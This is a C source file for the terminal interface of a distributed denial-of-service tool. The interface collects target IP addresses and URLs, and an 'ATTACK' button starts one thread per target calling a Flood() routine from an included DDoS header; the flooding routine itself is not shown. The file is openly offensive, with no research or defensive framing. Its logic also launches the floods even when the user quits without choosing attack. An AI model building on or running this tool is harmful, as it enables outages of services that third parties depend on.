#define STB_DS_IMPLEMENTATION

#include <sys/ioctl.h>
#include <stb_ds.h>
#include <newt.h>

#include <pthread.h>
#include <unistd.h>
#include <regex.h>

#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include <DDoS.h>

static char** GlobalIPs  = NULL;
static char** GlobalURLs = NULL;

void* FloodThread(void* arg)
{
    char* ipAddress = (char*)arg;
    Flood(ipAddress);
    return NULL;
}

void* DNSLookupThread(void* arg)
{
    char* url = (char*)arg;
    char* ipAddress = DNSLookup(url);
    if (ipAddress != NULL) 
        Flood(ipAddress);
    return NULL;
}

static bool ValidURL(const char* url)
{
    regex_t regex;
    int ret;
    const char* pattern = "^(https?|ftp)://[^\\s/$.?#].[^\\s]*$";

    ret = regcomp(&regex, pattern, REG_EXTENDED);
    if (ret != 0) 
        return false;

    ret = regexec(&regex, url, 0, NULL, 0);
    regfree(&regex);
    return !ret;
}

static void ErrorPrompt(const char* type)
{
    newtCls();
    newtCenteredWindow(strlen(type)+2, 4, "Error");
    
    newtComponent label = newtLabel(1, 1, type);
    newtComponent button = newtCompactButton((strlen(type)-4)/2, 3, "OK");
    newtComponent form = newtForm(NULL, NULL, 0);
    newtFormAddComponents(form, label, button, NULL);
    
    newtRunForm(form);
    newtFormDestroy(form);
}

static void Dialog(newtComponent* form, const char* label, char* output)
{
    newtCls();
    newtCenteredWindow(22, 3, label);

    char* buffer = "";
    newtComponent entry = newtEntry(1, 1, "", 20, (const char**)&buffer, NEWT_FLAG_SCROLL | NEWT_FLAG_RETURNEXIT);
    newtComponent button = newtCompactButton(8, 2, "Ok");
    newtFormAddComponents(*form, entry, button, NULL);
    newtRunForm(*form);
    strcpy(output, buffer);
    newtFormDestroy(*form);
}

static void AddIpCallback()
{
    char ipAddress[0x800];
    newtComponent ipForm = newtForm(NULL, NULL, 0);
    Dialog(&ipForm, "Add IP", ipAddress);
    if (ValidIP(ipAddress))
        arrput(GlobalIPs, strdup(ipAddress));
    else 
        ErrorPrompt("Invalid IP");
}

static void AddUrlCallback()
{
    char urlAddress[0x800];
    newtComponent urlForm = newtForm(NULL, NULL, 0);
    Dialog(&urlForm, "Add URL", urlAddress);
    if (ValidURL(urlAddress))
        arrput(GlobalURLs, strdup(urlAddress));
    else
        ErrorPrompt("Invalid URL");
}

int main() 
{
    struct winsize windowSize;
    ioctl(STDOUT_FILENO, TIOCGWINSZ, &windowSize);

    newtInit();
    newtCls();

    bool isRunning = true;
    bool attack = false;

    while (isRunning)
    {
        newtCenteredWindow(windowSize.ws_col-5, windowSize.ws_row-5, "Null Porn");
        newtRefresh();

        newtComponent content   = newtForm(NULL, NULL, 0);

        newtComponent addIPButton  = newtButton(1,  1, "Add IP");
        newtComponent addURLButton = newtButton(15, 1, "Add URL");
        newtComponent attackButton = newtButton(windowSize.ws_col-17, 1, "ATTACK");

        newtComponent contentList = newtListbox(1, 6, windowSize.ws_row-11, NEWT_FLAG_SCROLL | NEWT_FLAG_BORDER);
        newtListboxSetWidth(contentList, windowSize.ws_col-7);

        for (int i = 0; i < arrlen(GlobalIPs); i++)
            newtListboxAppendEntry(contentList, GlobalIPs[i], (void*)(intptr_t)i);
        for (int i = 0; i < arrlen(GlobalURLs); i++)
            newtListboxAppendEntry(contentList, GlobalURLs[i], (void*)(intptr_t)i);
        
        newtFormAddComponents(content, addIPButton, addURLButton, attackButton, contentList, NULL);
        newtRunForm(content);
        
        newtComponent cursor = newtFormGetCurrent(content);

             if (cursor == addIPButton)  AddIpCallback();
        else if (cursor == addURLButton) AddUrlCallback();
        else if (cursor == attackButton) { isRunning = false;
                                           attack    = true; }
        else isRunning = false;

        newtFormDestroy(content);
    }

    newtFinished();

    pthread_t ipThreads[arrlen(GlobalIPs)];
    pthread_t urlThreads[arrlen(GlobalURLs)];

    for (int i = 0; i < arrlen(GlobalIPs); i++)
        pthread_create(&ipThreads[i], NULL, FloodThread, GlobalIPs[i]);
    for (int i = 0; i < arrlen(GlobalURLs); i++)
        pthread_create(&urlThreads[i], NULL, DNSLookupThread, GlobalURLs[i]);

    for (int i = 0; i < arrlen(GlobalIPs); i++)
        pthread_join(ipThreads[i], NULL);
    for (int i = 0; i < arrlen(GlobalURLs); i++)
        pthread_join(urlThreads[i], NULL);

    arrfree(GlobalURLs);
    arrfree(GlobalIPs);
}
